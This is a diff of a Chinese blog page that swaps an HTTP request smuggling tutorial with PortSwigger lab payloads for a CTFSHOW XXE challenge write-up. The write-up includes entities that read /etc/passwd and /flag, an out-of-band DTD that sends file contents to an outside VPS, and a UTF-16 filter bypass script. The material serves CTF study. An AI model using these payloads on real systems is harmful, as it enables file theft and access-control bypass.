@@ -4,9 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="HTTP 请求走私, marin的小窝">
-    <meta name="description" content="HTTP 请求走私HTTP 请求走私漏洞成因HTTP 请求走私攻击，就是像走私一样在一个 HTTP 请求包中夹带另一个或者多个 HTTP 请求包，常发生于 HTTP/1.1 中
-在现代网络中，用户和应用服务器之间一般不会直接连接，而是通过反">
+    <meta name="keywords" content="CTFSHOW-XXE, marin的小窝">
+    <meta name="description" content="XXEweb373&amp;lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile &amp;#x3D; file_get_contents(&amp;#39;php:&amp;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>HTTP 请求走私 | marin的小窝</title>
+    <title>CTFSHOW-XXE | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -250,12 +253,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/1647056042390.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">HTTP 请求走私</h1>
+                    <h1 class="description center-align post-title">CTFSHOW-XXE</h1>
                 </div>
             </div>
         </div>
@@ -283,8 +286,8 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                <span class="chip bg-color">刷题</span>
                             </a>
                         
                     </div>
@@ -295,8 +298,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/WEB/" class="post-category">
-                                WEB
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                CTFSHOW
                             </a>
                         
                     </div>
@@ -308,7 +311,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-12-05
+                    2025-08-27
                 </div>
                 
 
@@ -332,249 +335,223 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HTTP-请求走私"><a href="#HTTP-请求走私" class="headerlink" title="HTTP 请求走私"></a>HTTP 请求走私</h1><h2 id="HTTP-请求走私-1"><a href="#HTTP-请求走私-1" class="headerlink" title="HTTP 请求走私"></a>HTTP 请求走私</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>HTTP 请求走私攻击，就是像走私一样在一个 HTTP 请求包中夹带另一个或者多个 HTTP 请求包，常发生于 <code>HTTP/1.1</code> 中</p>
-<p>在现代网络中，用户和应用服务器之间一般不会直接连接，而是通过反向代理进行转发到服务器<br>典型的架构是：用户 –&gt; 前端服务器（Front-end）–&gt; 后端服务器（Back-end）</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205180903-7tg8uqe.png" alt="image"></p>
-<p>为了提高性能，前后端服务器一般会使用 HTTP Keep-Alive，多个 HTTP 请求复用同一个 TCP 连接依次发送</p>
-<p>漏洞产生点就在这里，如果前后端服务器对一个请求在哪里结束和下一个请求在哪里开始的判断标准不一致，攻击者就可以让前端认为是一个请求，但是后端却认为是两个请求，这里就走私了数据</p>
-<p>‍</p>
-<h3 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h3><p>要利用这个漏洞，就得关注两个请求头</p>
-<h4 id="Content-Length-CL"><a href="#Content-Length-CL" class="headerlink" title="Content-Length (CL)"></a><code>Content-Length (CL)</code></h4><p>这个是直接指定 HTTP 消息体的字节长度，结束条件为读取完指定的字节数</p>
-<ul>
-<li>CL 计算长度需要计算上 <code>\r\n</code> 的两个字节</li>
-</ul>
-<h4 id="Transfer-Encoding-TE"><a href="#Transfer-Encoding-TE" class="headerlink" title="Transfer-Encoding (TE)"></a><code>Transfer-Encoding (TE)</code></h4><p>用来指定使用分块编码，这个协议不知道数据的总长度，但是将数据分块传输的，每发一快，就告诉这一块有多大</p>
-<p>什么是分块呢，每一个由 CRLF 也就是 <code>\r\n</code> 截断的就是一块</p>
-<pre class="line-numbers language-none" data-start="1"><code class="language-none">[分块长度的十六进制数] + \r\n
-[这一块的具体内容] + \r\n</code></pre>
+                <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
 
-<p>结束标识</p>
-<pre class="line-numbers language-none" data-start="1"><code class="language-none">0\r\n
-\r\n</code></pre>
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+if(isset($xmlfile))&#123;
+    $dom &#x3D; new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+    $creds &#x3D; simplexml_import_dom($dom);
+    $ctfshow &#x3D; $creds-&gt;ctfshow;
+    echo $ctfshow;
+&#125;
+highlight_file(__FILE__);    </code></pre>
 
-<ul>
-<li>TE 计算长度并不需要计算最后的 <code>\r\n</code></li>
-<li>按照 rfc 规范，当这个请求头一起出现时，CL 将被忽略</li>
-</ul>
-<p>‍</p>
-<h3 id="请求走私类型"><a href="#请求走私类型" class="headerlink" title="请求走私类型"></a>请求走私类型</h3><p>HTTP 请求走私的类型主要根据前后端对 <code>Content-Length (CL)</code>​ 和 <code>Transfer-Encoding (TE)</code>​ 的优先级的处理差异导致的，一般按照 <code>前端处理方式 . 后端处理方式</code> 来命名</p>
-<ul>
-<li>这里的攻击都可以加上一个 <code>Connection: close</code> 来表示结束了，告诉服务器不需要继续等待了</li>
-</ul>
-<h4 id="CL-TE-攻击"><a href="#CL-TE-攻击" class="headerlink" title="CL.TE 攻击"></a>CL.TE 攻击</h4><p>攻击场景：前端服务器只认 CL，而后端服务器支持并优先使用 TE</p>
-<p>payload 示例<br>（正确的格式这里的 <code>\r\n</code> 是不应该写出来的，因为这里已经有一个换行了，但是为了好看这里还是写上了，后面都一样）</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 10
-Transfer-Encoding: chunked
-
-0\r\n
-\r\n
-Marin</code></pre>
-
-<p>在前端来看，这里 <code>Content-Length: 10</code> 刚好 payload 长度是 10，前端就会认为没有问题<br>但是后端用 TE 头来处理的时候，发现了结束的标识，就认为这个请求包已经结束了，多处来的 marin，就会被认为是下一个包的开始</p>
-<p>下一个包就会变成这样，就会导致下一个包的数据 400 或 403</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">marinPOST &#x2F; HTTP&#x2F;1.1
-……</code></pre>
-
-<p>通过这个性质，我们更进一步发送下面的 payload</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 32
-Transfer-Encoding: chunked
-
-0\r\n
-\r\n
-GET &#x2F;admin HTTP&#x2F;1.1\r\nFoo: x</code></pre>
-
-<p>这个数据拼接到下一个请求中，最后没有加换行，就将原本的请求完全吃掉了，变成我们期望的请求，这样可以利用受害者的 cookie 完成越权访问，</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">GET &#x2F;admin HTTP&#x2F;1.1
-Foo: xGET &#x2F;home HTTP&#x2F;1.1
-……</code></pre>
-
-<p>‍</p>
-<h4 id="TE-CL-攻击"><a href="#TE-CL-攻击" class="headerlink" title="TE.CL 攻击"></a>TE.CL 攻击</h4><p>攻击场景：前端服务器支持并优先使用 TE，后端只认 CL</p>
-<p>payload 示例</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 3
-Transfer-Encoding: chunked
-
-5\r\n
-Marin\r\n
-0\r\n
-\r\n</code></pre>
-
-<p>前端服务器依照 TE 来读取，第一个块字节长度是 5，然后读到结束标识，这个请求没有问题，成功放行到后端<br>后端处理的时候，只读到了 CL 指示的 3 的长度，也就是 <code>5\r\n</code> 后面的数据就被截断了，但是这里比较尴尬的是结束标识也同样被留到下一个请求包中</p>
-<p>所以这里需要构造完整的请求包来让后续执行我们恶意的请求，或者直接就是让请求 400</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5c\r\n
-GPOST &#x2F; HTTP&#x2F;1.1\r\n
-Content-Type: application&#x2F;x-www-form-urlencoded\r\n
-Content-Length: 15\r\n
-\r\n
-x&#x3D;1\r\n
-0\r\n
-\r\n</code></pre>
-
-<p>‍</p>
-<h4 id="TE-TE-攻击"><a href="#TE-TE-攻击" class="headerlink" title="TE.TE 攻击"></a>TE.TE 攻击</h4><p>攻击场景：前后端都支持 TE，但是对请求的解析有差异</p>
-<p>核心原理：攻击者发送一个写的有点不规范的 TE 请求头，一个解析容错性强的就认为这个确实是 TE，另一个解析比较严谨的，认为这就不是 TE，我不认可，还是读 CL 吧</p>
-<p>所以这里 payload 的关键其实是处理什么 TE 头能够让一个服务器处理，另一个服务器忽略，然后判断出是哪一个忽略了，走回上两个攻击的形式</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 13
-Transfer-Encoding: chunked
-Transfer-Encoding: cow
-
-……</code></pre>
-
-<ul>
-<li><p>双重 Header<br>可能有的服务器优先解析第一个，有的优先解析第二个，第二个非法就忽略了所有 TE 头</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding: chunked
-Transfer-Encoding: cow</code></pre>
-</li>
-<li><p>空格混淆<br>在 TE 头冒号前加一个空格<br>或者是在最开头加一个空格</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding : chunked
- Transfer-Encoding: chunked</code></pre>
-</li>
-<li><p>换行混淆<br>在 TE 头后面加一个换行</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding:
- chunked</code></pre>
-</li>
-<li><p>制表符混淆<br>用制表符代替空格</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding:[tab]chunked</code></pre>
-</li>
-<li><p>内容混淆<br>添加 <code>chunked</code> 关键字时，添加一个字母，看服务器是精准匹配还是模糊匹配</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding: xchunked</code></pre>
-</li>
-<li><p>结构注入<br>这里利用的是 HTTP 处理换行符的不同</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">X: X[\n]Transfer-Encoding: chunked</code></pre>
-
-<p>假设有的服务器认为这个 <code>\n</code>​ 不算换行符，那这里就只是 X 头，但是如果服务器将这个和 <code>\r\n</code> 都视为换行符，那这里就会被识别为</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">X: X
-Transfer-Encoding: chunked</code></pre></li>
-</ul>
-<p>‍</p>
-<h4 id="CL-CL-攻击"><a href="#CL-CL-攻击" class="headerlink" title="CL.CL 攻击"></a>CL.CL 攻击</h4><p>这个就算不那么常见的了（也很难写成这样</p>
-<p>攻击场景：前后端都支持 CL</p>
-<p>这里利用是传两个 CL 头，RFC 有规定，如果出现两个 CL 头，就要报 400，这里就是测试服务器有没有严格实现</p>
-<p>‍</p>
-<h4 id="CL-不为-0-的-GET-请求"><a href="#CL-不为-0-的-GET-请求" class="headerlink" title="CL 不为 0 的 GET 请求"></a>CL 不为 0 的 GET 请求</h4><p>这个也是规范问题，就是前端服务器允许了 GET 请求可以带请求体，并且设置了 CL 头，但是后端忽略了 CL 头，导致请求体走私了</p>
-<p>‍</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>这个是 burp 的实验室，这里就尝试打一下</p>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">什么是 HTTP 请求走私？教程及示例 | 网络安全学院 — What is HTTP request smuggling? Tutorial &amp; Examples | Web Security Academy</a></p>
-<h3 id="CL-TE-基本漏洞"><a href="#CL-TE-基本漏洞" class="headerlink" title="CL.TE 基本漏洞"></a>CL.TE 基本漏洞</h3><p>几个包翻了一下，可以发现只有主页面的请求是用的 HTTP&#x2F;1.1 协议，虽然返回的是 HTTP&#x2F;2</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205204343-rq8bzsa.png" alt="image"></p>
-<p>这里也是神秘的（，自己发的时候就会变成 HTTP&#x2F;2 ，需要手动修改</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205204536-5ir2n29.png" alt="image"></p>
-<p>这里也很简单，这个包发两次就行</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0ad800c7045fa8a780589e7a001000b9.web-security-academy.net
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-G</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205204642-51opnhq.png" alt="image"></p>
-<p>‍</p>
-<h3 id="TE-CL-基本漏洞"><a href="#TE-CL-基本漏洞" class="headerlink" title="TE.CL 基本漏洞"></a>TE.CL 基本漏洞</h3><p>这个和上面一样，只是要数长度，这里可以使用拓展</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205205537-ah7n9xi.png" alt="image"></p>
-<p>就能自动转成需要的拓展</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0aaf00ed03b57ae780d63f6400df000e.web-security-academy.net
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5d
-GPOST &#x2F; HTTP&#x2F;1.1
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 15
-
-x&#x3D;1
-0
-
+<p><code>libxml_disable_entity_loader(false);</code> 这一句允许开启外部实体的加载</p>
+<p><code>$ctfshow = $creds-&gt;ctfshow;</code> 这里会将 ctfshow 节点的内容提取出来</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY marin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+]&gt;
+&lt;root&gt;
+  &lt;ctfshow&gt;&marin;&lt;&#x2F;ctfshow&gt;
+&lt;&#x2F;root&gt;
 </code></pre>
 
-<p>这里有一个关键就是 <code>Content-Length: 15</code>​ 长度，明明这里才 3，为什么需要 15，因为这里是为将下一个请求的请求头给包裹到这个请求的 POST 中 <code>GET / HTTP/1.1</code> 的长度就是 12，刚好被消化掉</p>
+<p>读取 flag 成功</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250827142801-20260228215035-x7028t0.png" alt="image"></p>
 <p>‍</p>
-<h3 id="通过差异响应确认-CL-TE-漏洞"><a href="#通过差异响应确认-CL-TE-漏洞" class="headerlink" title="通过差异响应确认 CL.TE 漏洞"></a>通过差异响应确认 CL.TE 漏洞</h3><pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0a39004c03757ad680ea496e004a0064.web-security-academy.net
-Cookie: session&#x3D;gRi8G38F8Z3oIpOfB4ueLn9DCPQ8dh9q
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 29
-Transfer-Encoding: chunked
+<h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
 
-0
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+if(isset($xmlfile))&#123;
+    $dom &#x3D; new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+&#125;
+highlight_file(__FILE__);    </code></pre>
 
-GET &#x2F;404 HTTP&#x2F;1.1
-Foo:x</code></pre>
+<p>这里没有能输出的地方，感觉需要 ssrf 或者一些外带的手段</p>
+<p>先上传一个</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+  &lt;!ENTITY % marin SYSTEM &quot;http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;1.dtd&quot;&gt;
+  %marin;
+]&gt;
+&lt;root&gt;
+1
+&lt;&#x2F;root&gt;</code></pre>
 
+<p>在 vps 中写一个 dtd 文件，然后再启动一下服务，让外部能够访问这个文件</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">python3 -m http.server 8888</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250827145829-20260228215035-o8mvyyg.png" alt="image"></p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &#x25; xxe  SYSTEM &#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;%file;&#39;&gt; &quot;&gt;
+%dtd;
+%xxe;</code></pre>
+
+<p>然后要监听这个里面的端口，就能接收到 flag</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250827154304-20260228215035-4fd4rg8.png" alt="image"></p>
+<blockquote>
+<p>整体的逻辑</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+	&lt;!-- 通过伪协议获取服务器中的文件 --&gt;
+  &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+	&lt;!-- 引用自己的服务器上的 dtd 文件 --&gt;
+  &lt;!ENTITY % marin SYSTEM &quot;http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;1.dtd&quot;&gt;
+	&lt;!-- 调用 dtd 文件加载进来 --&gt;
+	&lt;!-- 这里是一个嵌套的，先调用 dtd 触发里面的另一个参数 --&gt;
+	&lt;!-- 里面有一个 xxe 的参数，将前面获取的文件替换，然后会请求目标地址 --&gt;
+	&lt;!-- 这里的 &amp;#x25 就是 % 号 --&gt;
+  &lt;!ENTITY % dtd &quot;&lt;!ENTITY &#x25; xxe  SYSTEM &#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;%file;&#39;&gt; &quot;&gt;
+	%dtd;
+	%xxe;
+]&gt;
+&lt;root&gt;
+1
+&lt;&#x2F;root&gt;</code></pre></blockquote>
 <p>‍</p>
-<h4 id="通过差异响应确认-TE-CL-漏洞"><a href="#通过差异响应确认-TE-CL-漏洞" class="headerlink" title="通过差异响应确认 TE.CL 漏洞"></a>通过差异响应确认 TE.CL 漏洞</h4><pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0aac00a50356381881f025a900950062.web-security-academy.net
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-length: 4
-Transfer-Encoding: chunked
+<p>‍</p>
+<h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
 
-5e
-POST &#x2F;404 HTTP&#x2F;1.1
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 16
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+if(preg_match(&#39;&#x2F;&lt;\?xml version&#x3D;&quot;1\.0&quot;&#x2F;&#39;, $xmlfile))&#123;
+    die(&#39;error&#39;);
+&#125;
+if(isset($xmlfile))&#123;
+    $dom &#x3D; new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+&#125;
+highlight_file(__FILE__);    </code></pre>
 
-x&#x3D;1
-0
+<p>这个匹配前面的 xml</p>
+<p>试试直接删除</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250827161355-20260228215035-ie3pm2j.png" alt="image"></p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+  &lt;!ENTITY % marin SYSTEM &quot;http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;1.dtd&quot;&gt;
+  %marin;
+]&gt;
+&lt;root&gt;
+1
+&lt;&#x2F;root&gt;</code></pre>
 
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250827161414-hih1dhx.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+if(preg_match(&#39;&#x2F;&lt;\?xml version&#x3D;&quot;1\.0&quot;&#x2F;i&#39;, $xmlfile))&#123;
+    die(&#39;error&#39;);
+&#125;
+if(isset($xmlfile))&#123;
+    $dom &#x3D; new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+&#125;
+highlight_file(__FILE__);    </code></pre>
+
+<p>和上一题一样的</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+  &lt;!ENTITY % marin SYSTEM &quot;http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;1.dtd&quot;&gt;
+  %marin;
+]&gt;
+&lt;root&gt;
+1
+&lt;&#x2F;root&gt;</code></pre>
+
+<h3 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+if(preg_match(&#39;&#x2F;&lt;\?xml version&#x3D;&quot;1\.0&quot;|http&#x2F;i&#39;, $xmlfile))&#123;
+    die(&#39;error&#39;);
+&#125;
+if(isset($xmlfile))&#123;
+    $dom &#x3D; new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+&#125;
+highlight_file(__FILE__);    </code></pre>
+
+<p>这里多禁用了 http </p>
+<p>这里是看 wp 学习的，xml 文档的编码中，不仅支持 utf-8 编码，同时支持 utf-16 编码，使用脚本实现</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">import requests
+
+url &#x3D; &quot;https:&#x2F;&#x2F;4e25f406-d37f-4095-9973-9f56cacb6599.challenge.ctf.show&#x2F;&quot;
+payload &#x3D; &#39;&#39;&#39;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+  &lt;!ENTITY % marin SYSTEM &quot;http:&#x2F;&#x2F;101.35.151.42:8888&#x2F;1.dtd&quot;&gt;
+  %marin;
+]&gt;
+&lt;root&gt;
+1
+&lt;&#x2F;root&gt;&#39;&#39;&#39;
+payload &#x3D; payload.encode(&#39;utf-16&#39;)
+print(payload)
+re &#x3D; requests.post(url, data&#x3D;payload)
+print(re.text)
 </code></pre>
 
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250827162816-20260228215035-syi92x3.png" alt="image"></p>
 <p>‍</p>
-<h4 id="CL-TE-漏洞绕过前端安全控制"><a href="#CL-TE-漏洞绕过前端安全控制" class="headerlink" title="CL.TE 漏洞绕过前端安全控制"></a>CL.TE 漏洞绕过前端安全控制</h4><p>发送两次发现需要 local 才行</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0a5f00b904b0b3e08096947d00410050.web-security-academy.net
-Cookie: session&#x3D;xmGY4Yyh9zfxxyTnlUOTkpW4wGzu82Z8
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 32
-Transfer-Encoding: chunked
+<h3 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h3><p>一个神秘的登录框，提示是 python</p>
+<p>查看源码</p>
+<pre class="line-numbers language-javascript" data-language="javascript" data-start="1"><code class="language-javascript">function doLogin()&#123;
+	var username &#x3D; $(&quot;#username&quot;).val();
+	var password &#x3D; $(&quot;#password&quot;).val();
+	if(username &#x3D;&#x3D; &quot;&quot; || password &#x3D;&#x3D; &quot;&quot;)&#123;
+		alert(&quot;Please enter the username and password!&quot;);
+		return;
+	&#125;
+	
+	var data &#x3D; &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;&#x2F;username&gt;&lt;password&gt;&quot; + password + &quot;&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;&quot;; 
+    $.ajax(&#123;
+        type: &quot;POST&quot;,
+        url: &quot;doLogin&quot;,
+        contentType: &quot;application&#x2F;xml;charset&#x3D;utf-8&quot;,
+        data: data,
+        dataType: &quot;xml&quot;,
+        anysc: false,
+        success: function (result) &#123;
+        	var code &#x3D; result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
+        	var msg &#x3D; result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
+        	if(code &#x3D;&#x3D; &quot;0&quot;)&#123;
+        		$(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
+        	&#125;else if(code &#x3D;&#x3D; &quot;1&quot;)&#123;
+        		$(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
+        	&#125;else&#123;
+        		$(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
+        	&#125;
+        &#125;,
+        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;
+            $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);
+        &#125;
+    &#125;); 
+&#125;</code></pre>
 
-0
+<p>发现这里的 post 可以传入 xml ，感觉可以直接对着改</p>
+<pre class="line-numbers language-javascript" data-language="javascript" data-start="1"><code class="language-javascript">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY marin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;
+&marin;
+&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre>
 
-GET &#x2F;admin HTTP&#x2F;1.1
-Foo: x</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205212849-ducoq5j.png" alt="image"></p>
-<p>修改之后发现有两个标头导致出问题了</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205213054-m17vjv1.png" alt="image"></p>
-<p>那就利用 post 的方法将所有的都化为请求体</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0a5f00b904b0b3e08096947d00410050.web-security-academy.net
-Cookie: session&#x3D;xmGY4Yyh9zfxxyTnlUOTkpW4wGzu82Z8
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 69
-Transfer-Encoding: chunked
-
-0
-
-POST &#x2F;admin HTTP&#x2F;1.1
-Host: localhost
-Content-Length: 55
-
-x&#x3D;1</code></pre>
-
